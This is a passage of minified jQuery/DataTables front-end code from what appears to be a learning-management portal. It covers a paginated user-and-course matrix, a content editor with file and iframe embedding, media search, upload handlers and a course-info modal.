info-text-small":"",n=t.oLanguage.info.replace("###link-class###","tl-matrix-column-info").replace("###test-selector###",a).replace("###more-icon-class###","tl-matrix-column-size-more"),r='<div class="dropdown tl-matrix-column-info-wrapper pull-right'+i+o+'">'+(n=n.replace(/_START_/g,t._iColDisplayStart+1).replace(/_END_/g,t._iColDisplayStart+t._iColDisplayLength>t._iColRecordsDisplay?t._iColRecordsDisplay:t._iColDisplayStart+t._iColDisplayLength).replace(/_TOTAL_/g,t._iColRecordsDisplay))+'         <ul class="dropdown-menu" role="menu">';$.each(e,(function(i,a){var o=t._iColDisplayLength==a?"tl-matrix-active-length":"",n=a*t._iDisplayLength>y||i>0&&a>t._iColRecordsDisplay&&e[i-1]>=t._iColRecordsDisplay,s=n?"disabled":"",l=n||a==t._iColDisplayLength?"tl-cursor-default":"tl-cursor-pointer";r+='<li class="'+s+'"><a class="'+s+" "+l+" tl-matrix-column-info-page-length "+o+'" href="javascript:void(0)" data-length-option="'+a+'" '+(window.testEnvActive?"data-test-id='matrix-show-columns-"+a+"'":"")+">"+a+"</a></li>"})),r+="</ul></div>",$(".tl-matrix-header").append(r)}myportal.matrix.additionalSettings={_iColDisplayLength:f,_iColDisplayStart:h,_iColRecordsDisplay:m,_iColDisplayOrder:d,_ajaxDrawUrl:l,_iSmallControlsThreshold:9999},$("#"+a).on("preInit.dt",(function(t,e){$.extend(!0,$.fn.dataTable.settings[0],myportal.matrix.additionalSettings)})),$("#"+a).on("preXhr.dt",(function(){myportal.matrix.ajaxRequestInProgress=!0;var t=$("#"+a+" tbody").height();$("#"+a+" tbody").html(w).find(".dataTables_empty").css("height",t+"px"),$(".DTFC_LeftBodyWrapper").hide(),$("#tl-loading-pane").show()})),$("#"+a).on("xhr.dt",(function(){$(window).trigger("scroll"),$(".DTFC_LeftBodyWrapper").show(),$("#tl-loading-pane").hide(),myportal.matrix.ajaxRequestInProgress=!1})),$("#"+a+" th").on("click.dt",(function(t){if(myportal.matrix.ajaxRequestInProgress)return t.preventDefault(),t.stopImmediatePropagation(),!1})),$("#"+a).on("preInit.dt",(function(t,e){_(e)})),$.fn.DataTable.ext.errMode="none",$("#"+a).on("error.dt",(function(t,e,i,a){var o="",n=myportal.app.translate("dtable-error");e.jqXHR.responseJSON.message&&(o=decodeURIComponent(e.jqXHR.responseJSON.message)),o===n?myportal.app.notify({type:"error",message:n}):myportal.app.error(a)})),$("#"+a).DataTable({scrollY:!1,scrollX:!0,fixedColumns:{leftColumns:2},lengthChange:!0,serverSide:!0,orderClasses:!1,searchDelay:400,info:!1,columns:n,order:c,pageLength:u,deferLoading:p,ajax:{url:s,type:"POST",data:{"column-order":d,"column-page-start":h,"column-page-length":f}},dom:r,pagingType:"matrix_dropdown",search:{search:v},autoWidth:!1,stateSave:!1,initComplete:function(t,e){$("#"+a+"_wrapper .tl-matrix-header .tl-matrix-header-tools .tl-matrix-selected-filters").remove(),$("#"+a+"_wrapper .tl-matrix-header .tl-matrix-header-tools .tl-matrix-filtering-wrapper").remove(),$(x).appendTo("#"+a+"_wrapper .tl-matrix-header .tl-matrix-header-tools"),$("#"+a+"_wrapper .tl-matrix-header .tl-matrix-header-tools .tl-matrix-focus-wrapper").remove(),$(k).appendTo("#"+a+"_wrapper .tl-matrix-header .tl-matrix-header-tools"),$(C).appendTo("#"+a+"_wrapper .tl-matrix-header .tl-matrix-header-tools"),""==v&&t._iRecordsDisplay<=3?$("#"+a+"_wrapper .tl-matrix-header .dataTables_filter").hide():($("#"+a+"_wrapper .tl-matrix-header .dataTables_filter label").addClass("tl-can-clear-input").append('<div class="tl-clear-input-btn"><i class="icon-remove"></i></div>'),""!=v&&$(".tl-can-clear-input input").trigger("change"))},drawCallback:function(e){!function(e){$(".tl-matrix-row-info-wrapper").remove();var i=0==e._iRecordsDisplay||0==e._iColRecordsDisplay?" hide":"",a="tl-matrix-row-info",o=window.testEnvActive?'data-test-id="matrix-show-more-less-rows"':"",n="tl-matrix-row-size-more",r=e._iRecordsDisplay>e._iSmallControlsThreshold||e._iColRecordsDisplay>e._iSmallControlsThreshold?" info-text-small":"",s=e.oLanguage.info.replace("###link-class###",a).replace("###test-selector###",o).replace("###more-icon-class###",n);s=s.replace(/_START_/g,e._iDisplayStart+1).replace(/_END_/g,e._iDisplayStart+e._iDisplayLength>e._iRecordsDisplay?e._iRecordsDisplay:e._iDisplayStart+e._iDisplayLength).replace(/_TOTAL_/g,e._iRecordsDisplay);var l='<div class="dropup tl-matrix-row-info-wrapper pull-left'+i+r+'">'+s+'         <ul class="dropdown-menu" role="menu">';$.each(t,(function(i,a){var o=e._iDisplayLength==a?"tl-matrix-active-length":"",n=a*e._iColDisplayLength>y||i>0&&a>e._iRecordsDisplay&&t[i-1]>=e._iRecordsDisplay,r=n?"disabled":"",s=n||a==e._iDisplayLength?"tl-cursor-default":"tl-cursor-pointer";l+='<li class="'+r+'"><a class="'+r+" "+s+" tl-matrix-row-info-page-length "+o+'" href="javascript:void(0)" data-length-option="'+a+'" '+(window.testEnvActive?"data-test-id='matrix-show-rows-"+a+"'":"")+">"+a+"</a></li>"})),l+="</ul></div>",$(".tl-matrix-footer .tl-matrix-info-pagination-wrapper").prepend(l)}(e),_(e),T();var i=$.cookie("cookie_"+o+"_focus");i&&$('.tl-matrix-focus-wrapper .tl-matrix-focus-control[data-focus-type="'+i+'"]').trigger("click"),"asc"==e._iColDisplayOrder?$(".tl-matrix-rotated-cell-header").addClass("sorting_asc"):"desc"==e._iColDisplayOrder&&$(".tl-matrix-rotated-cell-header").addClass("sorting_desc"),0!=g&&g(e),0==e._iRecordsDisplay?($("#"+a+"-empty-results").show(),$("#"+a+"_wrapper").find("table").hide(),$(".tl-matrix-column-info-wrapper").hide()):($("#"+a+"-empty-results").hide(),$("#"+a+"_wrapper").find("table").show(),$(".tl-matrix-column-info-wrapper").show()),Math.ceil(e._iRecordsDisplay/e._iDisplayLength)<=1?$("#"+a+"_wrapper .tl-matrix-footer .dataTables_paginate").hide():$("#"+a+"_wrapper .tl-matrix-footer .dataTables_paginate").show(),Math.ceil(e._iColRecordsDisplay/e._iColDisplayLength)<=1||0==e._iRecordsDisplay?$("#"+a+"_wrapper .tl-matrix-header .dataTables_paginate").hide():$("#"+a+"_wrapper .tl-matrix-header .dataTables_paginate").show(),0==e._iRecordsDisplay?$("#"+a+"_wrapper .tl-matrix-header .tl-matrix-filtering-wrapper").hide():$("#"+a+"_wrapper .tl-matrix-header .tl-matrix-filtering-wrapper").show(),0==e._iRecordsDisplay?$("#"+a+"_wrapper .tl-matrix-header .tl-matrix-focus-wrapper").hide():$("#"+a+"_wrapper .tl-matrix-header .tl-matrix-focus-wrapper").show(),(e._iRecordsDisplay>e._iSmallControlsThreshold||e._iColRecordsDisplay>e._iSmallControlsThreshold)&&($("#"+a+"_wrapper .tl-matrix-header .dataTables_paginate").addClass("pagination-small-controls"),$("#"+a+"_wrapper .tl-matrix-footer .dataTables_paginate").addClass("pagination-small-controls"))},language:{info:'<a href="#" class="dropdown-toggle ###link-class###" data-toggle="dropdown" data-target="#" role="button" ###test-selector###>_START_ - _END_ <span class="###more-icon-class###" title="'+myportal.app.translate("matrix-more-less-results")+'"></span></a>&nbsp;'+myportal.app.translate("matrix-of-total"),search:"",infoEmpty:"",infoFiltered:"",zeroRecords:"-",thousands:".",paginate:{next:"",previous:""},aria:{sortAscending:"",sortDescending:"",paginate:{next:myportal.app.translate("next"),previous:myportal.app.translate("previous")}}}}),$("#"+a).css("width","100%"),$("#"+a).on("processing.dt",(function(t,e,i){i?$("#tl-loading-pane").show():$("#tl-loading-pane").hide()})),$(".tl-matrix-header").find("input").attr("placeholder",myportal.app.translate("search-users")).addClass("tl-matrix-search-input"),$(".tl-matrix-header .tl-matrix-search-input").parent("label").addClass("tl-can-clear-input"),$(document).on("click",".tl-matrix-header .tl-clear-input-btn",(function(){$(".tl-matrix-header .tl-matrix-search-input").val("").trigger("input").focus()})),window.testEnvActive&&$(".tl-matrix-header").find("input").attr("data-test-id","matrix-search-input"),$(".tl-matrix-header .tl-matrix-search-input").tooltip({placement:"bottom",trigger:"manual",title:myportal.app.translate("matrix-search-input-threshold")}),$(".tl-matrix-header .tl-matrix-search-input").unbind().bind("input",(function(){$(this).val().length>=b&&($("#"+a).DataTable().search($(this).val()).draw(),i=!0),i&&""==$(this).val()&&($("#"+a).DataTable().search("").draw(),i=!1),T()})),$(window).scroll((function(){$(window).scrollTop()>=178?($(".dataTables_scrollHead, .DTFC_LeftHeadWrapper, .tl-matrix-header").addClass("tl-matrix-header-fixed-to-top"),$(".dataTables_scroll, .DTFC_LeftWrapper").addClass("tl-matrix-body-with-fixed-header")):($(".dataTables_scrollHead, .DTFC_LeftHeadWrapper, .tl-matrix-header").removeClass("tl-matrix-header-fixed-to-top"),$(".dataTables_scroll, .DTFC_LeftWrapper").removeClass("tl-matrix-body-with-fixed-header"))})),$(document).off("click",".tl-matrix-filter-control"),$(document).on("click",".tl-matrix-filter-control",(function(t){var e=$(this).data("filter-var"),i=$(this).data("filter-value"),o=$("#"+a).DataTable().settings()[0];o._iColDisplayStart=0,o._sFilterVar=e,o._sFilterValue=i,myportal.matrix.redrawMatrix(o)})),$(document).off("click",".tl-matrix-focus-control"),$(document).on("click",".tl-matrix-focus-control",(function(t){if($(this).data("focus-reset")){var e=$(this).data("focus-all-cells-selector");$(e).closest("td").css("opacity","1"),$(e).removeClass("blurred").removeClass("focused"),$("#"+a+"_wrapper .tl-matrix-header .tl-matrix-header-tools .tl-matrix-selected-focus").remove(),setTlmsCookie("cookie_"+o+"_focus","",{expires:null,path:"/",domain:myEffectiveDomain,secure:!1})}else{var i=$(this).data("focus-cell-selector");e=(e=$(this).data("focus-all-cells-selector"))+":not("+i+")",$(e).closest("td").css("opacity","0.25"),$(i).closest("td").css("opacity","1"),$(e).removeClass("focused").addClass("blurred"),$(i).removeClass("blurred").addClass("focused");var n=$(this).data("focus-label");$("#"+a+"_wrapper .tl-matrix-header .tl-matrix-header-tools .tl-matrix-selected-focus").remove();var r=S.replace("###current-focus-label###",n).replace("###current-focus-class###",i.replace("."," ").replace(",",""));$(r).appendTo("#"+a+"_wrapper .tl-matrix-header .tl-matrix-header-tools");var s=$(this).data("focus-type");setTlmsCookie("cookie_"+o+"_focus",s,{expires:null,path:"/",domain:myEffectiveDomain,secure:!1})}})),$(document).off("click",".tl-matrix-rotated-cell-header:not(.column_sorting_disabled)"),$(document).on("click",".tl-matrix-rotated-cell-header:not(.column_sorting_disabled)",(function(t){t.preventDefault(),t.stopImmediatePropagation();var e=$("#"+a).DataTable().settings()[0];e._iColDisplayOrder="asc"==e._iColDisplayOrder?"desc":"asc",myportal.matrix.redrawMatrix(e)})),$(document).off("click",".tl-matrix-column-info-wrapper .tl-matrix-column-info-page-length"),$(document).on("click",".tl-matrix-column-info-wrapper .tl-matrix-column-info-page-length",(function(){if(myportal.matrix.ajaxRequestInProgress)return!1;var t=$("#"+a).DataTable().settings()[0],i=$(this).data("length-option");i==t._iColDisplayLength||$(this).hasClass("disabled")||t._iDisplayLength*i>y||(i<e[0]?(t._iColDisplayLength=e[0],t._iColDisplayStart=0,myportal.matrix.redrawMatrix(t)):(t._iColDisplayLength=i,t._iColDisplayStart=0,myportal.matrix.redrawMatrix(t)))})),$(document).off("click",".tl-matrix-row-info-wrapper .tl-matrix-row-info-page-length"),$(document).on("click",".tl-matrix-row-info-wrapper .tl-matrix-row-info-page-length",(function(){if(myportal.matrix.ajaxRequestInProgress)return!1;var e=$("#"+a).DataTable(),i=e.settings()[0],o=$(this).data("length-option");o==i._iDisplayLength||$(this).hasClass("disabled")||i._iColDisplayLength*o>y||(o<t[0]?e.page.len(t[0]).draw():e.page.len(o).draw())}))},redrawMatrix:function(t){var e=t.sTableId,i=t._ajaxDrawUrl,a=encodeURIComponent($("#"+e+'_wrapper .tl-matrix-header .dataTables_filter input[type="search"]').val()),o={ajax:1,"row-order":t.aaSorting[0][1],"row-page-length":t._iDisplayLength,"column-order":t._iColDisplayOrder,"column-page-start":t._iColDisplayStart,"column-page-length":t._iColDisplayLength,"search-value":a};void 0!==t._sFilterVar&&void 0!==t._sFilterValue&&(o[t._sFilterVar]=t._sFilterValue),myportal.app.ajax(i,{type:"POST",data:o,success:function(t){var i=JSON.parse(t);if(i.success){var a=$("#"+e).closest(".outter-table-wrapper").parent("div");$("#"+e).DataTable().destroy(),a.empty(),a.html(i.data.drawnMatrix),$(window).trigger("scroll")}},complete:function(){},error:function(t){var e=$.parseJSON(t.responseText);myportal.app.notify({type:"error",message:decodeURIComponent(e.message)})}})}}}(),myportal.namespace("myportal.content"),myportal.content=function(){var t=!1;function e(t){t||(t=$("#editor-wysiwyg")),myportal.app.initEditor(t),onChangeView=function(){if("wysiwyg"==myportal.app.editor_mode[t.attr("id")]){myportal.app.editor_mode[t.attr("id")]="html";try{value=myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].code(),myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].code(n(value))}catch(t){console.log(t)}}else{myportal.app.editor_mode[t.attr("id")]="wysiwyg";try{value=myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].code(),myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].code(o(value.replace(/<\/iframe>/," </iframe>")))}catch(t){console.log(t)}}},myportal.app.wysiwygEditor&&myportal.app.wysiwygEditor.length&&($(".note-toolbar").off("click",'[data-event="codeview"]',onChangeView),$(".note-toolbar").on("click",'[data-event="codeview"]',onChangeView)),$("form").on("submit",(function(){myportal.app.leavingFromNormalLink=!0;var e="editor-wysiwyg";t.attr("id")&&(e=t.attr("id"));var i=$("#"+e).siblings(".note-editor").find('[data-event="codeview"]');if(myportal.app.editor_mode&&myportal.app.editor_mode[t.attr("id")]&&"html"==myportal.app.editor_mode[t.attr("id")]&&i.click(),""==$('input[name="name"]').val()&&null!=myportal.content.unit_type&&$('input[name="name"]').val(myportal.content.unit_type+"_"+Math.round((new Date).getTime()/1e3)),$(".note-editable").length>0&&myportal.app.wysiwygEditor&&myportal.app.wysiwygEditor.length){var a=myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].code();""==a.replace(/<br ?\/?>/g,"").replace(/\s/g,"").replace(/&nbsp;/g,"")&&(a=""),myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].siblings(".note-editor").find("textarea.note-codable").val(n(a));var o=t.attr("id");$(this).find('textarea[name="text"]').length?$(this).find("textarea#"+o+'[name="text"]').val(n(a)):$(this).find("textarea#"+o+'[name="data"]').val(n(a))}setTimeout((function(){myportal.app.leavingFromNormalLink=!1}),200)}))}function i(){setTimeout((function(){resetEditorScroll()}),300)}function a(){$(".search_submit").click((function(){$(this).hasClass("disabled")||$(this).is("[disabled=disabled]")||$(this).prev(".search-query").val()&&i()}));var e="file";function i(){var i=$(".search-options-"+e).find("input").val();0===i.indexOf("http://")||0===i.indexOf("https://")?function(){var i=$(".search-options-"+e).find("input").val();if(i){$(".tl-search-input").attr("disabled",!0).addClass("disabled"),$(".search_submit").button("loading").attr("disabled",!0);try{var a=$(".search-options-"+e).find("input").attr("data-parse-url");myportal.app.ajax(a,{type:"post",data:{url:i},success:function(e,i,a){var o;o="application/json"===a.getResponseHeader("Content-Type")?e.data:$.parseJSON(e).data,$(".editor-options").show(),myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].code(o.content),t||(o.title?$("input[name='name']").val(o.title):$("input[name='name']").val("Unit_"+Math.round((new Date).getTime()/1e3))),$(".tl-search-input").attr("disabled",!1).removeClass("disabled"),$(".search_submit").button("reset").attr("disabled",!1),$(".search-results").hide()}})}catch(t){$(".tl-search-input").attr("disabled",!1).removeClass("disabled"),$(".search_submit").button("reset").attr("disabled",!1),myportal.app.error("Oops, something went wrong! Please try again")}}}():a()}function a(i){if($(".tl-search-input").attr("disabled",!0).addClass("disabled"),$(".search_submit").button("loading").attr("disabled",!0),void 0===i&&(i=0),!(i<0)){var a=i,o=$(".search-options-"+e).find("input").val(),n=$(".search-options-"+e).find("input").attr("data-search-url"),r=$(".search-options-"+e).find("input").attr("data-type");myportal.app.ajax(n,{type:"post",data:{url:n,type:r,query:o,offset:i},success:function(e){var o=$.parseJSON(e).data;if(0==o.length?$(".search-results .carousel-control").hide():$(".search-results .carousel-control").show(),$(".search-results").show(),$(".thumbnails").empty(),$.parseJSON(e).next_token?$(".right.tl-unit-carousel").attr("data-offset",$.parseJSON(e).next_token):isNaN(a)?$(".right.tl-unit-carousel").attr("data-offset","0"):$(".right.tl-unit-carousel").attr("data-offset",a),$.parseJSON(e).prev_token?$(".left.tl-unit-carousel").attr("data-offset",$.parseJSON(e).prev_token):isNaN(a)?$(".left.tl-unit-carousel").attr("data-offset","0"):$(".left.tl-unit-carousel").attr("data-offset",a),!o.length)return $(".thumbnails").html("<h4>"+myportal.app.translate("no-results-found")+"</h4>"),$(".tl-search-input").attr("disabled",!1).removeClass("disabled"),void $(".search_submit").button("reset").attr("disabled",!1);$(o).each((function(e,a){$(".thumbnails").append('<li class="span2"><div class="thumbnail thumbnail-result"><img src="'+a.img+'" alt="'+a.title+'" title = "'+a.title+'" data-toggle = "'+a.url+'"/><div class="caption"><h5>'+a.title_shortend+"</h5></div></div></li>"),i=a.offset,$(".thumbnail-result").find("img").on("click",(function(){$(".thumbnail-result").removeClass("selected"),$(this).parent().addClass("selected"),t||$("input[name='name']").val($(this).attr("title"));var e='<center><iframe class="video-frame" width="100%" height="'+myportal.content.video_height+'" src="'+$(this).attr("data-toggle")+'" frameborder="0" allowfullscreen></iframe></center>';$(".editor-options").show(),myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].code(e),$(".toggle-editor").find('[data-toggle="editor-output"]').trigger("click"),initStickyEditor()}))})),$(".tl-search-input").attr("disabled",!1).removeClass("disabled"),$(".search_submit").button("reset").attr("disabled",!1)}})}}$(".toggle-search").each((function(t,i){$(i).hasClass("active")&&(e=$(i).attr("data-search-category"),$('[name="source_type"]').val(e))})),$(".toggle-search").on("click",(function(){if("file"==(e=$(this).attr("data-search-category"))&&$(".search-results").hide(),$(".search-options").hide(),$(this).hasClass("active"))return $(".search-results").hide(),$(this).removeClass("active"),!1;$(".search-options-"+e).show(),$('[name="source_type"]').val(e),$(".search-results").hide(),$(".thumbnails").find(".thumbnail-result").length>0&&"youtube"==e&&$(".search-results").show()})),$(".search-query").on("keypress",(function(t){if(13==t.keyCode&&$(this).val())return i(),!1})),$(".tl-unit-carousel").on("click",(function(){if($(this).hasClass("left")){a(isNaN($(this).attr("data-offset"))?$(this).attr("data-offset"):parseInt($(this).attr("data-offset"))-1)}else if($(this).hasClass("right")){a(isNaN($(this).attr("data-offset"))?$(this).attr("data-offset"):parseInt($(this).attr("data-offset"))+1)}}))}function o(t){var e=myportal.app.filescache.fileurls;myportal.app.filescache.filetypes;return null!==t.match(/\[File:#([0-9]*)#\]/g)&&(t=t.replace(/\[File:#([0-9]*)#\]/g,(function(t,i){if(jQuery.inArray(i,myportal.app.filescache.brokenfiles)>=0)return t;if(null==e[i]){var a=$(".editor-options").find(".editor-output").attr("data-info").replace("##fileid##",i);myportal.app.ajax(a,{type:"post",async:!1,data:{},success:function(t){var e=$.parseJSON(t).data;null!=e&&(myportal.app.filescache.fileurls[i]=e.url,myportal.app.filescache.filetypes[i]=e.content_type,myportal.app.filescache.fileids[decodeURIComponent(e.url)]=e.id)},error:function(t){0==myportal.app.filescache.brokenfiles.length&&myportal.app.error("Oops, something went wrong! Please make sure imported files really exist"),jQuery.inArray(i,myportal.app.filescache.brokenfiles)<0&&myportal.app.filescache.brokenfiles.push(i)}})}return null!=e[i]?decodeURIComponent(e[i]):t}))),t}function n(t){var e=t.match(/([^-]src=)(?:(["'])?((?:.(?!\2?\s+(?:\S+)=|\2))+.)\2?)?/);return null!==e&&(t=t.replace(/([^-]src=)(?:(["'])?((?:.(?!\2?\s+(?:\S+)=|\2))+.)\2?)?/g,(function(t,e){return r(e,t)||t}))),null!==(e=t.match(/([^-]data=)(?:(["'])?((?:.(?!\2?\s+(?:\S+)=|\2))+.)\2?)?/))&&(t=t.replace(/([^-]data=)(?:(["'])?((?:.(?!\2?\s+(?:\S+)=|\2))+.)\2?)?/g,(function(t,e){return r(e,t)||t}))),null!==(e=t.match(/([^-]value=)(?:(["'])?((?:.(?!\2?\s+(?:\S+)=|\2))+.)\2?)?/))&&(t=t.replace(/([^-]value=)(?:(["'])?((?:.(?!\2?\s+(?:\S+)=|\2))+.)\2?)?/g,(function(t,e){return r(e,t)||t}))),t}function r(t,e){var i=myportal.app.filescache.fileids,a=e.substr(t.length+1,e.length-t.length-2).replace(/&amp;/g,"&");return!!i[a]&&t+'"[File:#'+i[a]+'#]"'}return{init_editor:function(t){e(t)},parseFileTags:function(t){return o(t)},revertFileTags:function(t){return n(t)},init:function(){var n;e(),$(".toggle-completion").find(".btn").on("click",(function(){var t=$(this).attr("data-toggle");$(".completion-question-options").hide(),$(".completion-time-options").hide(),$('[name="completion"]').val(t)})),$(".completion-question").on("click",(function(){$(".completion-question-options").show()})),$(".completion-time").on("click",(function(){$(".completion-time-options").show()})),function(){$(".embed-page").on("click",(function(){e()})),$("#url2embed").on("keypress",(function(t){if(13==t.keyCode)return e(),!1})),$(".launch-search").on("click",(function(){$(this).hasClass("disabled")||$(this).is("[disabled=disabled]")||a()})),$("#tl-service-data").on("keypress",(function(t){if(13==t.keyCode)return a(),!1})),$("#tl-service-data").on("change",(function(){!/^(http:\/\/www\.|https:\/\/www\.|http:\/\/|https:\/\/)[a-z0-9]+([\-\.]{1,2}[a-z0-9]+)*\.[a-z]{2,64}(:[0-9]{1,5})?(\/.*)?$/i.test($(this).val())||$(this).hasClass("disabled")||$(this).is("[disabled=disabled]")||a()}));var e=function(){if($("#url2embed").val().replace(/\s+/g,"")){$(".editor-options").show();var t=$("#url2embed").val();"http://"!==t.substring(0,7)&&"https://"!==t.substring(0,8)&&(t="http://"+t);var e="",a='width="100%"';if($("#iframe-width").val()&&(a='width="'+$("#iframe-width").val()+'"'),$("#iframe-height").val()&&(e='height="'+$("#iframe-height").val()+'"'),"popup"==$("#tl-embed-type").val())var o="<center><a class = 'btn btn-primary btn-xlarge tl-iframe-popup' data-url = '"+t+"'>"+myportal.app.translations["click-to-start"]+"</a></center>";else o="<iframe src='"+t+"' "+a+" "+e+"> </iframe>";myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].code(o),i()}},a=function(){var e=$("#tl-service-data").val();if(e)try{$("#tl-service-data").attr("disabled",!0).addClass("disabled"),$(".launch-search").button("loading").attr("disabled",!0);var i=$("#tl-service-data").attr("data-toggle");myportal.app.ajax(i,{type:"post",data:{url:e},success:function(e,i,a){var o;o="application/json"===a.getResponseHeader("Content-Type")?e.data:$.parseJSON(e).data,$(".editor-options").show(),$("#editor-wysiwyg-control-group .help-block").html(""),myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].code(o.content),t||$("input[name='name']").val(o.title),$("#tl-service-data").attr("disabled",!1).removeClass("disabled"),$(".launch-search").button("reset").attr("disabled",!1),setTimeout((function(){initStickyEditor()}),200)}})}catch(t){myportal.app.error("Oops, something went wrong! Please try again"),$("#tl-service-data").attr("disabled",!1).removeClass("disabled"),$(".launch-search").button("reset").attr("disabled",!1)}}}(),a(),$("#fileselect").on("change",(function(){var e=$(this);$(this).parents("form").find("input[type=submit]").next(".dropdown-toggle").addClass("disabled"),$(this).parents("form").find("input[type=submit]").addClass("disabled").attr("disabled",!0),$('[name="reset_bookmarks"]').parents(".controls").hide(),0!=$(this).val()&&(url=$(this).attr("data-file").replace("###id###",$(this).val()),$("#tl-embed-type").val()&&(url=url.replace("###type###",$("#tl-embed-type").val())),myportal.app.ajax(url,{success:function(i){e.parents("form").find("input[type=submit]").next(".dropdown-toggle").removeClass("disabled"),e.parents("form").find("input[type=submit]").removeClass("disabled").attr("disabled",!1);var a,n,r,s,l=$.parseJSON(i).data;"tincan"==l.content_type?$('[name="source_type"]').val("tincan"):"cmi5"==l.content_type?$('[name="source_type"]').val("cmi5"):"scorm"==l.content_type&&($('[name="source_type"]').val(""),$('[name="reset_bookmarks"]').parents(".controls").show()),$(".editor-options").show(),myportal.app.filescache.fileurls[l.id]=l.url,myportal.app.filescache.filetypes[l.id]=l.content_type,myportal.app.filescache.fileids[decodeURIComponent(l.url)]=l.id;try{cur_editor=myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1],"html"==myportal.app.editor_mode[cur_editor.attr("id")]?myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].code(decodeURIComponent(l.html)):myportal.app.wysiwygEditor[myportal.app.wysiwygEditor.length-1].code(o(decodeURIComponent(l.html)))}catch(t){}$("input[name=scorm_width]").val(decodeURIComponent(l.content_width)),t||$("input[name='name']").val((n=80,r=(a=decodeURIComponent(l.filename)).substring(a.lastIndexOf("."),a.length).toLowerCase(),s=a.replace(r,""),a.length<=n?a:(s=s.substr(0,n-r.length-5)+(a.length>n?"[...]":""))+r)),l.is_scorm_test&&$("#tl-is-scorm-test").length&&$("#tl-is-scorm-test").val("scorm_test"),l.datafromlms&&$("#datafromlms").length&&$("#datafromlms").val(decodeURIComponent(l.datafromlms)),$(".scorm-editor").length&&$(".scorm-editor").val(decodeURIComponent(l.html)),$("#tl-video-options-switch").length&&$("#tl-video-options-switch").show(),$("#tl-audio-options-switch").length&&$("#tl-audio-options-switch").show()}}))})),$("#documents_namespace").bind("fileuploaddone",(function(t,e){!1!==e.result.success&&showSelect2&&($("#fileselect").addClass("tl-select2"),$("#fileselect").select2({width:"element",minimumResultsForSearch:10,dropdownAutoWidth:!0}),i())})),$("#videos_namespace").bind("fileuploaddone",(function(t,e){!1!==e.result.success&&showSelect2&&($("#fileselect").addClass("tl-select2"),$("#fileselect").select2({width:"element",minimumResultsForSearch:10,dropdownAutoWidth:!0}),i())})),$("#flash_namespace").bind("fileuploaddone",(function(t,e){!1!==e.result.success&&showSelect2&&($("#fileselect").addClass("tl-select2"),$("#fileselect").select2({width:"element",minimumResultsForSearch:10,dropdownAutoWidth:!0}))})),$("#audio_namespace").bind("fileuploaddone",(function(t,e){!1!==e.result.success&&showSelect2&&($("#fileselect").addClass("tl-select2"),$("#fileselect").select2({width:"element",minimumResultsForSearch:10,dropdownAutoWidth:!0}),i())})),$("#ppt_namespace").bind("fileuploaddone",(function(t,e){!1!==e.result.success&&showSelect2&&($("#fileselect").addClass("tl-select2"),$("#fileselect").select2({width:"element",minimumResultsForSearch:10,dropdownAutoWidth:!0}),i())})),$("#captions_namespace").bind("fileuploaddone",(function(t,e){!1!==e.result.success&&showSelect2&&($("#captions_fileselect").addClass("tl-select2"),$("#captions_fileselect").select2({width:"element",minimumResultsForSearch:10,dropdownAutoWidth:!0}),i())})),$("#poster_image_namespace").bind("fileuploaddone",(function(t,e){!1!==e.result.success&&showSelect2&&($("#poster_image_fileselect").addClass("tl-select2"),$("#poster_image_fileselect").select2({width:"element",minimumResultsForSearch:10,dropdownAutoWidth:!0}),i())})),$("body").tooltip({selector:".tl-course-info-unit"}),$(".tl-course-info").on("click",(function(){var t=$(this).attr("data-url");myportal.app.ajax(t,{success:function(t){var e=JSON.parse(t),i=e.data.courseDescription,a=e.data.courseUnits,o=e.data.courseUnitsIcons,n=e.data.courseCompletedUnits,r=e.data.courseFailedUnits,s=e.data.unitsTooltip,l=e.data.courseRules,c=e.data.courseCertification,d=e.data.coursePrerequisites,p=e.data.updateCourseRating,u=e.data.courseUserRating,h=e.data.customCourseFields;if($("#tl-course-info-modal-name").html(e.data.courseName),$("#tl-course-info-modal-avatar").attr("src",e.data.courseAvatar),$("#tl-course-info-modal-fields").html(""),$("#tl-course-rating").length){p?$("#tl-course-rating").empty().append('<div id="courserating" class="average-rating tl-cursor-pointer" data-course-id="'+e.data.courseId+'" data-url="'+e.data.setCourseRatingUrl+'"></div>'):$("#tl-course-rating").empty().append('<div id="courserating" class="average-rating" data-rateit-readonly="true"></div>'),$("#courserating").rateit({max:$("#tl-course-rating").data("rating-max"),step:$("#tl-course-rating").data("rating-step"),value:e.data.courseRating});var f=u?"":'style="display: none;"';$("#tl-course-rating").append('<span class="tl-course-user-rating-info" '+f+">"+myportal.app.translate("your-rating")+': <span class="tl-course-user-rating-info-value">'+u+'</span> <span class="tl-course-user-rating-info-star"></span></span>')}if(null!=i)if(i.length>250){var m=jQuery.trim(i).substring(0,250).split(" ").slice(0,-1).join(" ")+"...";$("#tl-course-info-modal-description").html(m+"&nbsp;<a class=\"tl-more-info\" onclick=\"$('#tl-course-info-modal-description').html($('#tl-complete-description').html());\">"+myportal.app.translate("more")+"</a>"),$("#tl-course-info-modal-description-tmp").empty().append('<div id="tl-complete-description" style="display:none;">'+i+"&nbsp;<a class=\"tl-less-info\" onclick=\"$('#tl-course-info-modal-description').html($('#tl-incomplete-description').html());\">"+myportal.app.translate("less")+"</a></div>"),$("#tl-course-info-modal-description-tmp").append('<div id="tl-incomplete-description" style="display:none;">'+m+"&nbsp;<a class=\"tl-more-info\" onclick=\"$('#tl-course-info-modal-description').html($('#tl-complete-description').html());\">"+myportal.app.translate("more")+"</a></div>")}else $("#tl-course-info-modal-description").html(i);for(var g=0;g<h.length;g++)$("#tl-course-info-modal-fields").append('<span class="label" style="margin-right:5px">'+h[g].name+': <span style="font-weight:400">'+h[g].value+"</span></span>");if(null!=a)for($("#tl-course-info-modal-no-units").hide(),$("#tl-course-info-modal-unit-list").html(""),g=0;g<a.length;g++)if(o[g].length){var v=$("<li>"),y="";y=n&&n[g].length&&"1"==n[g]?"icon-ok 